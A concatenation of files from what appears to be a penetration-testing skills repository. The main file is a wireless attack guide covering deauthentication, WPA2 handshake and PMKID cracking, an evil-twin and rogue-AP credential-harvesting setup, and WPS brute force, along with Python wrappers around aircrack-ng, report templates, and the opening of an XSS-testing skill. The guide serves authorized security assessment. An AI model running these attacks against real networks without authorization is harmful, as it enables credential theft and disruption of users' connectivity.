Wireless penetration testing evaluates the security of an organization's WiFi infrastructure including encryption strength, authentication mechanisms, rogue access point detection, client isolation, and network segmentation. Testing covers 802.11a/b/g/n/ac/ax protocols, WPA2-PSK, WPA2-Enterprise, WPA3-SAE, captive portals, and Bluetooth/BLE where in scope.


## When to Use

- When conducting security assessments that involve performing wireless network penetration test
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Written authorization specifying wireless scope (SSIDs, BSSIDs, physical locations)
- Compatible wireless adapter supporting monitor mode and packet injection (e.g., Alfa AWUS036ACH, TP-Link TL-WN722N v1)
- Kali Linux with Aircrack-ng suite, Bettercap, Wifite, Kismet
- Physical proximity to target wireless networks
- GPS receiver for mapping (optional)

## Phase 1 — Wireless Reconnaissance

### Enable Monitor Mode

```bash
# Check wireless interfaces
iwconfig
airmon-ng

# Kill interfering processes
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0
# Interface becomes wlan0mon

# Verify monitor mode
iwconfig wlan0mon
```

### Passive Scanning

```bash
# Discover all networks in range
airodump-ng wlan0mon -w wireless_scan --output-format csv,pcap

# Filter by specific channel
airodump-ng wlan0mon -c 6 -w channel6_scan

# Scan 5GHz band
airodump-ng wlan0mon --band a -w 5ghz_scan

# Scan all bands
airodump-ng wlan0mon --band abg -w full_scan

# Kismet passive scanning (advanced)
kismet -c wlan0mon
# Access web UI at http://localhost:2501
```

### Network Inventory

| SSID | BSSID | Channel | Encryption | Clients | Signal |
|------|-------|---------|-----------|---------|--------|
| CorpWiFi | AA:BB:CC:DD:EE:01 | 6 | WPA2-Enterprise | 45 | -55dBm |
| CorpGuest | AA:BB:CC:DD:EE:02 | 11 | WPA2-PSK | 12 | -60dBm |
| PrinterNet | AA:BB:CC:DD:EE:03 | 1 | WEP | 3 | -70dBm |
| HiddenSSID | AA:BB:CC:DD:EE:04 | 36 | WPA2-PSK | 8 | -65dBm |

## Phase 2 — WPA2-PSK Attack

### Capture 4-Way Handshake

```bash
# Target specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:02 -w corpguest wlan0mon

# Deauthenticate a client to force reconnection (handshake capture)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:02 -c FF:FF:FF:FF:FF:FF wlan0mon

# Verify handshake captured
aircrack-ng corpguest-01.cap
# Look for "1 handshake" in output
```

### Crack WPA2 Key

```bash
# Dictionary attack with Aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt corpguest-01.cap

# GPU-accelerated cracking with Hashcat
# Convert cap to hccapx format
hcxpcapngtool -o hash.hc22000 corpguest-01.cap

# Hashcat mode 22000 (WPA-PBKDF2-PMKID+EAPOL)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# PMKID attack (no client needed)
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid_dump.pcapng \
  --filterlist_ap=AA:BB:CC:DD:EE:02 --filtermode=2
hcxpcapngtool -o pmkid_hash.hc22000 pmkid_dump.pcapng
hashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt
```

## Phase 3 — WPA2-Enterprise Attack

```bash
# Set up rogue AP with EAP credential harvesting
# Using hostapd-mana
cat > hostapd-mana.conf << 'EOF'
interface=wlan0mon
ssid=CorpWiFi
hw_mode=g
channel=6
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=hostapd.eap_user
mana_wpe=1
mana_credout=creds.txt
EOF

# EAP user file
cat > hostapd.eap_user << 'EOF'
*   PEAP,TTLS,TLS,FAST
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP "t" [2]
EOF

hostapd-mana hostapd-mana.conf

# Captured MSCHAP challenges can be cracked
# Crack NetNTLMv1 from EAP-MSCHAP
hashcat -m 5500 creds.txt /usr/share/wordlists/rockyou.txt
```

## Phase 4 — Evil Twin Attack

```bash
# Create evil twin with Bettercap
sudo bettercap -iface wlan0mon

# Within Bettercap:
wifi.recon on
wifi.ap

# Or manual evil twin with hostapd + dnsmasq
cat > evil_twin.conf << 'EOF'
interface=wlan1
ssid=CorpGuest
hw_mode=g
channel=6
driver=nl80211
auth_algs=1
wpa=0
EOF

# Start captive portal
hostapd evil_twin.conf &
dnsmasq --no-daemon --interface=wlan1 --dhcp-range=192.168.1.10,192.168.1.100,12h \
  --address=/#/192.168.1.1

# Deauth clients from real AP to force connection to evil twin
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:02 wlan0mon
```

## Phase 5 — Additional Tests

### Rogue AP Detection

```bash
# Compare authorized AP list against discovered APs
# Authorized BSSIDs from client documentation
# Flag any unknown BSSIDs broadcasting corporate SSIDs

# Check for misconfigured APs
# Personal hotspots bridging to corporate network
# IoT devices with default WiFi settings
```

### Client Isolation Testing

```bash
# After connecting to guest network:
# Scan for other clients
nmap -sn 192.168.10.0/24

# Attempt to reach corporate resources
nmap -sT -p 80,443,445,3389 10.0.0.0/24

# Test VLAN hopping
# If guest network is not properly segmented from corporate
```

### WPS Attack

```bash
# Check for WPS-enabled APs
wash -i wlan0mon

# WPS PIN bruteforce (if WPS enabled and not rate-limited)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:03 -vv

# Pixie-Dust attack (offline WPS PIN recovery)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:03 -K 1 -vv
```

## Findings Template

| Finding | Severity | CVSS | Remediation |
|---------|----------|------|-------------|
| WPA2-PSK with weak passphrase | High | 8.1 | Use 20+ char passphrase or migrate to WPA2-Enterprise |
| WEP encryption on printer network | Critical | 9.1 | Upgrade to WPA2/WPA3, segment printer VLAN |
| WPS enabled on guest AP | Medium | 5.3 | Disable WPS on all access points |
| No client isolation on guest | High | 7.5 | Enable AP isolation and VLAN segmentation |
| Corporate SSID broadcasts on rogue AP | High | 8.1 | Deploy WIDS/WIPS, implement 802.1X with cert validation |
| EAP-MSCHAP without cert pinning | High | 7.5 | Enforce server certificate validation on all clients |

## References

- Aircrack-ng Documentation: https://www.aircrack-ng.org/doku.php
- CISA Aircrack-ng: https://www.cisa.gov/resources-tools/services/aircrack-ng
- WiFi Alliance WPA3 Specification: https://www.wi-fi.org/discover-wi-fi/security
- NIST SP 800-153: Guidelines for Securing WLANs
- Hashcat WPA modes: https://hashcat.net/wiki/doku.php?id=example_hashes

===== END FILE =====


===== FILE: skills/performing-wireless-network-penetration-test/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-wireless-network-penetration-test/assets/template.md =====
# Wireless Penetration Test — Report Template

## Document Control
| Field | Value |
|-------|-------|
| Client | [Name] |
| Test Type | Wireless Network Security Assessment |
| Location(s) | [Physical locations tested] |
| SSIDs In Scope | [List] |
| Period | [Start] — [End] |

## Executive Summary
[Overview of wireless security posture including encryption weaknesses, rogue APs, segmentation issues]

## Findings Summary
| Severity | Count |
|----------|-------|
| Critical | [N] |
| High | [N] |
| Medium | [N] |
| Low | [N] |

## Detailed Findings
### Finding [N]: [Title]
| Attribute | Detail |
|-----------|--------|
| SSID / BSSID | [Values] |
| Severity | [Level] |
| Issue | [Description] |
| Remediation | [Fix] |

## Recommendations
1. [Priority recommendations]

===== END FILE =====


===== FILE: skills/performing-wireless-network-penetration-test/references/api-reference.md =====
# API Reference: Wireless Network Penetration Testing

## Aircrack-ng Suite

| Tool | Description |
|------|-------------|
| `airmon-ng start <iface>` | Enable monitor mode |
| `airodump-ng <mon_iface>` | Scan for wireless networks |
| `airodump-ng --bssid <bssid> -c <ch> -w <prefix> <iface>` | Capture handshake |
| `aireplay-ng -0 5 -a <bssid> <iface>` | Deauthentication attack |
| `aircrack-ng <cap> -w <wordlist>` | Crack WPA/WPA2 handshake |
| `wash -i <iface>` | Detect WPS-enabled APs |
| `reaver -i <iface> -b <bssid>` | WPS PIN brute force |

## airodump-ng CSV Fields

| Column | Description |
|--------|-------------|
| BSSID | Access point MAC address |
| Channel | Operating channel |
| Encryption | WPA2, WPA, WEP, OPN |
| ESSID | Network name |
| Power | Signal strength (dBm) |

## Encryption Risk Levels

| Encryption | Risk |
|-----------|------|
| Open (OPN) | Critical - No encryption |
| WEP | Critical - Easily crackable |
| WPA (TKIP) | High - Deprecated |
| WPA2 (CCMP) | Medium - Dictionary attacks |
| WPA3 (SAE) | Low - Current standard |

## Python Libraries

| Library | Version | Purpose |
|---------|---------|---------|
| `subprocess` | stdlib | Execute aircrack-ng tools |
| `re` | stdlib | Parse tool output |
| `csv` | stdlib | Parse airodump CSV |

## References

- Aircrack-ng: https://www.aircrack-ng.org/doku.php
- Reaver: https://github.com/t6x/reaver-wps-fork-t6x
- WiFi Pineapple: https://www.hak5.org/products/wifi-pineapple

===== END FILE =====


===== FILE: skills/performing-wireless-network-penetration-test/references/standards.md =====
# Standards — Wireless Penetration Testing

## Standards
- IEEE 802.11: Wireless LAN standard
- WPA3 (WiFi Protected Access 3): Latest security protocol using SAE
- NIST SP 800-153: Guidelines for Securing Wireless Local Area Networks
- PCI DSS v4.0 Req 11.2: Wireless access point detection

## Wireless Encryption Comparison
| Protocol | Key Management | Crackable | Notes |
|----------|---------------|-----------|-------|
| WEP | Static IV | Trivially | Deprecated, never use |
| WPA-TKIP | PSK/Enterprise | Possible | Legacy, avoid |
| WPA2-PSK | PBKDF2/CCMP | Dictionary attacks | Requires strong passphrase |
| WPA2-Enterprise | 802.1X/RADIUS | Certificate attacks | Recommended with cert pinning |
| WPA3-SAE | Dragonfly handshake | Resistant | Best current option |

## Tools
| Tool | Purpose |
|------|---------|
| Aircrack-ng | Full wireless testing suite |
| Kismet | Wireless IDS and scanner |
| Bettercap | Network attack framework |
| Wifite | Automated WiFi attack tool |
| hcxdumptool | PMKID capture |
| Reaver | WPS PIN bruteforce |

===== END FILE =====


===== FILE: skills/performing-wireless-network-penetration-test/references/workflows.md =====
# Workflows — Wireless Penetration Testing

## Attack Flow
```
Monitor Mode Activation
    │
    ├── Passive Reconnaissance
    │   ├── SSID/BSSID discovery
    │   ├── Client enumeration
    │   └── Channel mapping
    │
    ├── WPA2-PSK Attacks
    │   ├── Handshake capture (deauth + capture)
    │   ├── PMKID attack (clientless)
    │   └── Offline cracking (Hashcat/Aircrack)
    │
    ├── WPA2-Enterprise Attacks
    │   ├── Rogue AP (hostapd-mana)
    │   ├── EAP credential capture
    │   └── MSCHAP hash cracking
    │
    ├── Evil Twin / Captive Portal
    │   ├── Clone SSID
    │   ├── Deauth real AP
    │   └── Credential harvest
    │
    └── Segmentation Testing
        ├── Client isolation
        ├── VLAN traversal
        └── Corporate network reach
```

===== END FILE =====


===== FILE: skills/performing-wireless-network-penetration-test/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for wireless network penetration testing.

Runs aircrack-ng suite tools via subprocess for WiFi reconnaissance,
WPA handshake capture, deauthentication testing, and generates
a wireless security assessment report.
"""

import subprocess
import json
import sys
import re
from datetime import datetime
from pathlib import Path


class WirelessPentestAgent:
    """Automates wireless network penetration testing with aircrack-ng."""

    def __init__(self, interface, output_dir="./wireless_pentest"):
        self.interface = interface
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.networks = []
        self.findings = []

    def enable_monitor_mode(self):
        """Put wireless interface into monitor mode using airmon-ng."""
        result = subprocess.run(
            ["airmon-ng", "start", self.interface],
            capture_output=True, text=True, timeout=30)
        mon_iface = f"{self.interface}mon"
        match = re.search(r"monitor mode.*enabled on (\w+)", result.stdout)
        if match:
            mon_iface = match.group(1)
        self.interface = mon_iface
        return {"monitor_interface": mon_iface, "status": result.returncode}

    def scan_networks(self, duration=30):
        """Scan for wireless networks using airodump-ng."""
        csv_prefix = str(self.output_dir / "scan")
        try:
            subprocess.run(
                ["airodump-ng", self.interface, "-w", csv_prefix,
                 "--output-format", "csv", "--write-interval", "1"],
                capture_output=True, text=True, timeout=duration)
        except subprocess.TimeoutExpired:
            pass

        csv_file = Path(f"{csv_prefix}-01.csv")
        if csv_file.exists():
            self.networks = self._parse_airodump_csv(csv_file)
        return self.networks

    def _parse_airodump_csv(self, csv_path):
        """Parse airodump-ng CSV output for network details."""
        networks = []
        try:
            lines = csv_path.read_text(errors="ignore").splitlines()
            in_ap_section = False
            for line in lines:
                if "BSSID" in line and "channel" in line.lower():
                    in_ap_section = True
                    continue
                if "Station MAC" in line:
                    break
                if in_ap_section and line.strip():
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 14:
                        enc = parts[5].strip()
                        networks.append({
                            "bssid": parts[0], "channel": parts[3],
                            "encryption": enc, "essid": parts[13],
                            "power": parts[8],
                        })
                        if enc in ("OPN", "WEP", ""):
                            self.findings.append({
                                "type": "Weak Encryption",
                                "severity": "Critical" if enc in ("OPN", "") else "High",
                                "bssid": parts[0], "essid": parts[13],
                                "encryption": enc or "Open",
                            })
        except (IndexError, UnicodeDecodeError):
            pass
        return networks

    def capture_handshake(self, bssid, channel, duration=60):
        """Capture WPA/WPA2 4-way handshake."""
        cap_prefix = str(self.output_dir / "handshake")
        try:
            subprocess.run(
                ["airodump-ng", self.interface, "--bssid", bssid,
                 "-c", str(channel), "-w", cap_prefix],
                capture_output=True, timeout=duration)
        except subprocess.TimeoutExpired:
            pass
        cap_file = Path(f"{cap_prefix}-01.cap")
        return {"capture_file": str(cap_file), "exists": cap_file.exists()}

    def crack_handshake(self, cap_file, wordlist):
        """Attempt to crack WPA handshake with aircrack-ng."""
        result = subprocess.run(
            ["aircrack-ng", cap_file, "-w", wordlist],
            capture_output=True, text=True, timeout=600)
        if "KEY FOUND" in result.stdout:
            match = re.search(r"KEY FOUND! \[ (.+?) \]", result.stdout)
            key = match.group(1) if match else "unknown"
            self.findings.append({"type": "WPA Key Cracked",
                                  "severity": "Critical", "key": key})
            return {"cracked": True, "key": key}
        return {"cracked": False}

    def test_wps(self, bssid):
        """Test WPS PIN vulnerability using reaver/wash."""
        result = subprocess.run(
            ["wash", "-i", self.interface], capture_output=True,
            text=True, timeout=30)
        wps_enabled = bssid in result.stdout
        if wps_enabled:
            self.findings.append({"type": "WPS Enabled", "severity": "High",
                                  "bssid": bssid})
        return {"wps_enabled": wps_enabled}

    def generate_report(self):
        report = {
            "report_date": datetime.utcnow().isoformat(),
            "interface": self.interface,
            "networks_found": len(self.networks),
            "findings": self.findings,
            "networks": self.networks[:50],
        }
        print(json.dumps(report, indent=2))
        return report


def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "wlan0"
    agent = WirelessPentestAgent(iface)
    agent.enable_monitor_mode()
    agent.scan_networks(duration=30)
    agent.generate_report()


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-wireless-network-penetration-test/scripts/process.py =====
#!/usr/bin/env python3
"""
Wireless Penetration Test — Automation Process

Parses airodump-ng CSV output and generates wireless assessment reports.

Usage:
    python process.py --scan-file scan-01.csv --authorized-aps authorized.txt --output ./results
"""

import csv
import json
import argparse
import datetime
from pathlib import Path


def parse_airodump_csv(csv_file: str) -> tuple[list[dict], list[dict]]:
    """Parse airodump-ng CSV output into APs and clients."""
    aps = []
    clients = []
    section = "ap"

    with open(csv_file, encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            if "Station MAC" in line:
                section = "client"
                continue
            if "BSSID" in line and section == "ap":
                continue

            fields = [f.strip() for f in line.split(",")]

            if section == "ap" and len(fields) >= 14:
                ap = {
                    "bssid": fields[0],
                    "first_seen": fields[1],
                    "last_seen": fields[2],
                    "channel": fields[3],
                    "speed": fields[4],
                    "privacy": fields[5],
                    "cipher": fields[6],
                    "authentication": fields[7],
                    "power": fields[8],
                    "beacons": fields[9],
                    "iv": fields[10],
                    "lan_ip": fields[11],
                    "id_length": fields[12],
                    "essid": fields[13] if len(fields) > 13 else "",
                }
                if ap["bssid"] and ap["bssid"] != "BSSID":
                    aps.append(ap)

            elif section == "client" and len(fields) >= 6:
                client = {
                    "station_mac": fields[0],
                    "first_seen": fields[1],
                    "last_seen": fields[2],
                    "power": fields[3],
                    "packets": fields[4],
                    "bssid": fields[5],
                    "probed_essids": fields[6] if len(fields) > 6 else "",
                }
                if client["station_mac"] and client["station_mac"] != "Station MAC":
                    clients.append(client)

    return aps, clients


def detect_rogue_aps(aps: list[dict], authorized_file: str) -> list[dict]:
    """Compare discovered APs against authorized list."""
    authorized_bssids = set()
    try:
        with open(authorized_file) as f:
            for line in f:
                bssid = line.strip().upper()
                if bssid:
                    authorized_bssids.add(bssid)
    except FileNotFoundError:
        print(f"[-] Authorized AP file not found: {authorized_file}")
        return []

    rogue_aps = []
    for ap in aps:
        if ap["bssid"].upper() not in authorized_bssids:
            rogue_aps.append(ap)

    return rogue_aps


def assess_encryption(aps: list[dict]) -> list[dict]:
    """Assess encryption strength of discovered APs."""
    findings = []
    for ap in aps:
        privacy = ap.get("privacy", "").upper()
        finding = {
            "essid": ap["essid"],
            "bssid": ap["bssid"],
            "encryption": privacy,
            "severity": "Info",
            "issue": None,
        }

        if "WEP" in privacy:
            finding["severity"] = "Critical"
            finding["issue"] = "WEP encryption is trivially crackable"
        elif "OPN" in privacy or not privacy.strip():
            finding["severity"] = "High"
            finding["issue"] = "Open network with no encryption"
        elif "WPA" in privacy and "TKIP" in ap.get("cipher", "").upper():
            finding["severity"] = "Medium"
            finding["issue"] = "TKIP cipher is deprecated"
        elif "WPA2" in privacy and "PSK" in ap.get("authentication", "").upper():
            finding["severity"] = "Low"
            finding["issue"] = "WPA2-PSK susceptible to dictionary attacks"
        elif "WPA3" in privacy:
            finding["severity"] = "Info"
            finding["issue"] = "WPA3-SAE provides strong protection"

        if finding["issue"]:
            findings.append(finding)

    return findings


def generate_report(aps: list[dict], clients: list[dict],
                     rogue_aps: list[dict], findings: list[dict],
                     output_dir: Path) -> str:
    """Generate wireless assessment report."""
    report_file = output_dir / "wireless_assessment_report.md"
    timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    with open(report_file, "w") as f:
        f.write("# Wireless Network Penetration Test Report\n\n")
        f.write(f"**Generated:** {timestamp}\n\n---\n\n")

        f.write("## Network Discovery\n\n")
        f.write(f"Total access points: **{len(aps)}**\n")
        f.write(f"Total clients: **{len(clients)}**\n\n")

        f.write("### Discovered Access Points\n\n")
        f.write("| ESSID | BSSID | Channel | Encryption | Auth | Signal |\n")
        f.write("|-------|-------|---------|-----------|------|--------|\n")
        for ap in aps:
            f.write(f"| {ap['essid']} | {ap['bssid']} | {ap['channel']} "
                    f"| {ap['privacy']} | {ap['authentication']} | {ap['power']}dBm |\n")
        f.write("\n")

        if rogue_aps:
            f.write("## Rogue Access Points\n\n")
            f.write(f"**{len(rogue_aps)} unauthorized APs detected**\n\n")
            for rap in rogue_aps:
                f.write(f"- **{rap['essid']}** ({rap['bssid']}) — Ch {rap['channel']}\n")
            f.write("\n")

        f.write("## Security Findings\n\n")
        for finding in sorted(findings, key=lambda x: {"Critical": 0, "High": 1,
                                                         "Medium": 2, "Low": 3,
                                                         "Info": 4}.get(x["severity"], 5)):
            f.write(f"### [{finding['severity']}] {finding['essid']}\n")
            f.write(f"- BSSID: {finding['bssid']}\n")
            f.write(f"- Issue: {finding['issue']}\n\n")

        f.write("## Recommendations\n\n")
        f.write("1. Upgrade all WEP/open networks to WPA2-Enterprise or WPA3\n")
        f.write("2. Deploy WIDS/WIPS for rogue AP detection\n")
        f.write("3. Use 20+ character passphrases for any remaining PSK networks\n")
        f.write("4. Enable client isolation on guest networks\n")
        f.write("5. Implement 802.1X with certificate validation\n")

    print(f"[+] Report: {report_file}")
    return str(report_file)


def main():
    parser = argparse.ArgumentParser(description="Wireless Pentest Report Generator")
    parser.add_argument("--scan-file", required=True, help="Airodump-ng CSV file")
    parser.add_argument("--authorized-aps", help="File with authorized BSSIDs")
    parser.add_argument("--output", default="./results")
    args = parser.parse_args()

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    aps, clients = parse_airodump_csv(args.scan_file)
    print(f"[+] Parsed {len(aps)} APs and {len(clients)} clients")

    rogue_aps = []
    if args.authorized_aps:
        rogue_aps = detect_rogue_aps(aps, args.authorized_aps)

    findings = assess_encryption(aps)
    generate_report(aps, clients, rogue_aps, findings, output_dir)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/testing-for-xss-vulnerabilities/SKILL.md =====
---
name: testing-for-xss-vulnerabilities
description: Tests web applications for reflected, stored, and DOM-based Cross-Site
  Scripting by injecting JavaScript payloads with Burp Suite (XSS extensions, Active
  Scan++) and browser tools, then bypassing sanitization and CSP to demonstrate session
  hijacking and user impersonation. Use for OWASP WSTG client-side injection testing or
  when evaluating input sanitization and output encoding coverage.
domain: cybersecurity
subdomain: penetration-testing
tags:
- XSS
- cross-site-scripting
- client-side-security
- OWASP-A03
- JavaScript-injection
version: 1.0.0
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1055
---
# Testing for XSS Vulnerabilities

## When to Use

- Testing web applications for client-side injection vulnerabilities as part of OWASP WSTG testing
- Evaluating the effectiveness of input sanitization and output encoding across all application features
- Assessing the protection provided by Content Security Policy (CSP) headers against XSS exploitation
- Demonstrating the impact of XSS through session hijacking, credential theft, or phishing overlay to stakeholders
- Testing single-page applications (React, Angular, Vue) for DOM-based XSS in client-side routing and rendering

**Do not use** against applications without written authorization, for deploying persistent XSS payloads that affect real users, or for exfiltrating actual user session tokens from production environments.

## Prerequisites

- Authorized scope defining the target web application and acceptable testing activities
- Burp Suite Professional with XSS-focused extensions (XSS Validator, Reflector, Active Scan++)
- Browser with developer tools and XSS testing extensions (HackBar, XSS Hunter)
- XSS Hunter or Burp Collaborator for out-of-band payload verification
- SecLists XSS payload lists and custom payloads for WAF bypass scenarios


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1: Input and Output Mapping

Map every location where user input enters and is rendered by the application:

- **Reflected inputs**: Test every URL parameter, search field, error message, and HTTP header value that is reflected in the response
- **Stored inputs**: Identify features where input is saved and displayed later: user profiles, comments, forum posts, file names, support tickets, and chat messages
- **DOM inputs**: Identify client-side JavaScript that reads from `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, or `localStorage` and writes to the DOM
- **Output context identification**: For each reflected input, determine the rendering context:
  - HTML body: `<div>USER_INPUT</div>`
  - HTML attribute: `<input value="USER_INPUT">`
  - JavaScript string: `var x = 'USER_INPUT';`
  - URL context: `<a href="USER_INPUT">`
